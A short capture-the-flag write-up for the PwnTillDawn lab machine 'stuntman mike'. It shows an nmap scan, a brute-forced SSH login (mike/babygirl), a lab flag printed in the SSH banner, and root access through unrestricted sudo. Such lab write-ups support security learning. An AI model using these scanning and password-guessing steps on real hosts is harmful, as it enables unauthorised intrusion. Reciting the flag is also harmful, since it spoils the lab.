PwntillDawn
target :  10.150.150.166 
└─# nmap -sV -p- --open --min-rate 4000  10.150.150.166 
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 (protocol 2.0)
8089/tcp open  ssl/http Splunkd httpd

always if you want to connect to an ssh that you don't know use -v  or just if you see an ssh open port try first to connect using root and unknown pass:
You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360
root@10.150.150.166's password:

[22][ssh] host: 10.150.150.166   login: mike   password: babygirl

sudo -l
mike@stuntmanmike:~$ sudo -l
[sudo] password for mike: 
Matching Defaults entries for mike on stuntmanmike:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on stuntmanmike:
    (ALL : ALL) ALL

    Now just sudo su
    